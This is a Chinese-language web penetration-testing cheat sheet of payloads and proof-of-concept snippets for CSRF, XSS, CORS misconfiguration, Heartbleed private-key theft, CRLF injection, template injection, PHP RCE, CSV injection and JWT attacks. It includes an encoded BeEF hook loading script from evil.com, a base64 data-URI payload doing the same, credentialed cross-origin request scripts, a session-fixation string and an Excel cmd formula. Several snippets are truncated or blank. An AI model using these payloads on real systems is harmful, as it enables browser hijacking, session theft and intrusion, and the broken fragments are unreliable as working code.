案例:
    https://blog.appsecco.com/exploiting-csrf-on-json-endpoints-with-flash-and-redirects-681d4ad6b31b
    http://c0rni3sm.blogspot.com/2018/01/1800-in-less-than-hour.html
CSRF TO REDECT XSS
        Please wait... ;)
    let host = 'http://target.com'
    let beef_payload = '%3c%73%63%72%69%70%74%3e%20%73%3d%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%73%63%72%69%70%74%27%29%3b%20%73%2e%74%79%70%65%3d%27%74%65%78%74%2f%6a%61%76%61%73%63%72%69%70%74%27%3b%20%73%2e%73%72%63%3d%27%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d%2f%68%6f%6f%6b%2e%6a%73%27%3b%20%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%73%42%79%54%61%67%4e%61%6d%65%28%27%68%65%61%64%27%29%5b%30%5d%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%73%29%3b%20%3c%2f%73%63%72%69%70%74%3e'
    let alert_payload = '%3Cimg%2Fsrc%2Fonerror%3Dalert(1)%3E'
    function submitRequest() {
      var req = new XMLHttpRequest();
      req.open();
      req.setRequestHeader("Accept", "*\/*");
      req.withCredentials = true;
      req.onreadystatechange = function () {
        if (req.readyState === 4) {
          executeXSS();
        }
      }
      req.send();
    }
    function executeXSS() {
      window.location.assign(host+''+alert_payload);
    }
    submitRequest();
## 文件上传漏洞
在OS X上创建测试10g文件（对于测试文件上载限制很有用）：
    mkfile -n 10g temp_10GB_file
### 无限制的文件上传
资源:
    http://nileshkumar83.blogspot.com/2017/01/file-upload-through-null-byte-injection.html
一些备忘录:
### CORS配置错误
用于测试的POC:
          CORS POC Exploit
            Exploit
    function cors() {
      var req = new XMLHttpRequest();
      req.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
          document.getElementById("demo").innerHTML = this.responseText;
          // If you want to print something out after it finishes:
          //alert(req.getAllResponseHeaders());
          //alert(localStorage.access_token);
        }
      };
      // If you need to set a header (you probably won't):
      // req.setRequestHeader("header name", "value");
      req.open("GET", "", true);
      req.withCredentials = true;
      req.send();
    }
资源:
    https://www.securityninja.io/understanding-cross-origin-resource-sharing-cors/
    http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html
    https://www.youtube.com/watch?v=wgkj4ZgxI4c
    http://ejj.io/misconfigured-cors/
    https://www.youtube.com/watch?v=lg31RYYG-T4
    https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS
    https://w3c.github.io/webappsec-cors-for-developers/#cors
    http://gerionsecurity.com/2013/11/cors-attack-scenarios/
    Using CORS misconfiguration to steal a CSRF Token:
    https://yassineaboukir.com/blog/security-impact-of-a-misconfigured-cors-implementation/
## 测试心脏出血漏洞
    nmap -d --script ssl-heartbleed --script-args vulns.showall -sV -p   --script-trace -oA heartbleed-%y%m%d
### 偷私钥
    wget https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py
    echo ":" > targets.txt
    python heartbleed.py -f targets.txt -v -e
    wget https://raw.githubusercontent.com/sensepost/heartbleed-poc/master/heartbleed-poc.py
    python heartbleed-poc.py  -p  | less
## 重定向
重定向到beef：
使用Burp中的Decoder将其编码为base-64，并将其传递给payload：
    data:text/html;base64,PHNjcmlwdD4gcz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTsgcy50eXBlPSd0ZXh0L2phdmFzY3JpcHQnOyBzLnNyYz0naHR0cDovL2V2aWwuY29tOjMwMDAvaG9vay5qcyc7IGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdoZWFkJylbMF0uYXBwZW5kQ2hpbGQocyk7IDwvc2NyaXB0Pg==
other：
    http://;URL=javascript:alert('XSS')
    data:text/html%3bbase64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K
## CRLF注入
当你看到请求的参数是这样:
    http://inj.example.org/redirect.asp?origin=foo
回显是这样：
    HTTP/1.1 302 Object moved
    Date: Mon, 07 Mar 2016 17:42:46 GMT
    Location: account.asp?origin=foo
    Connection: close
    Content-Length: 121
    Object moved
    Object MovedThis object may be found here.
尝试CRLF注射：
    http://inj.example.org/redirect.asp?origin=foo%0d%0aSet-Cookie:%20ASPSESSIONIDACCBBTCD=SessionFixed%0d%0a
    CRLF： %0d%0a
    https://www.gracefulsecurity.com/http-header-injection/
    https://www.owasp.org/index.php/Testing_for_HTTP_Splitting/Smuggling_(OTG-INPVAL-016)
    https://www.acunetix.com/websitesecurity/crlf-injection/
    https://blog.innerht.ml/twitter-crlf-injection/
## 模板注入
您可以将一些代码放入jsfiddle以进行payload测试：
    {{constructor.constructor('alert(1)')()}}
## RCE
使用WEBSHEL​​L上传（.NET）绕过AV：  
这是一个示例，其中包含fuzzdb项目中的一个webshel​​l：
    REALLY NICE
    Command:
## PHP中的匿名函数RCE
    $inputFunc = function() use($a, $b, $c, &$f){echo(exec('whoami'));};
## PHP实验
如果您需要测试一些PHP代码，可以使用本机Web服务器来托管它：
    php -S 127.0.0.1:80 -t .
## PHP交互式SHELL
    php -a
## CSV注入
在Windows上的Excel中，输入以下内容以获取cmd shell：
    =cmd|'cmd'!''
exmaple:
movie：
## 有用的脚本
不断检查网站服务是否关闭：
    while true; do /usr/bin/wget "http://[target]/uri/path" --timeout 30 -O - 2>/dev/null | grep "[item on page]" || echo "The site is down"; sleep 10; done
## IDORS
## 服务器端包含注入
把它放在一个易受攻击的参数中：  
如果有效，您应该在响应中看到当前日期和时间输出。
``：输出环境变量。
``
more:
## 点击劫持
只需使用Burp的clickbandit。还要记住：Clickjacking适用于点击，而不适用于键盘。
poc:
         Clickjack test page
         Website is vulnerable to clickjacking!
)  
## 攻击JSON
利用burp标记参数进行主动扫描
## 反序列化漏洞
[Writeup on Oracle Weblogic CVE-2018-2628](https://www.nc-lp.com/blog/weaponize-oracle-weblogic-server-poc-cve-2018-2628)  
[Java Deserialization Scanner Burp
Extension](https://portswigger.net/bappstore/228336544ebe4e68824b5146dbbd93ae)  
[Java Serialized Payloads Burp
Extension](https://portswigger.net/bappstore/bc737909a5d742eab91544705c14d34f)
### 工具
[Ysoserial](https://github.com/summitt/burp-ysoserial/releases)
## 测试不安全的JWT
    获取JSON Web Tokens Burp扩展
    捕获请求，将其发送到Repeater
    单击JSON Web Tokens选项卡
    单击使用随机密钥对签名
    单击Alg None Attack下的下拉菜单
    单击Go
    查看会话后是否仍然有效
## LFI
## 子域名探测技术
原文地址：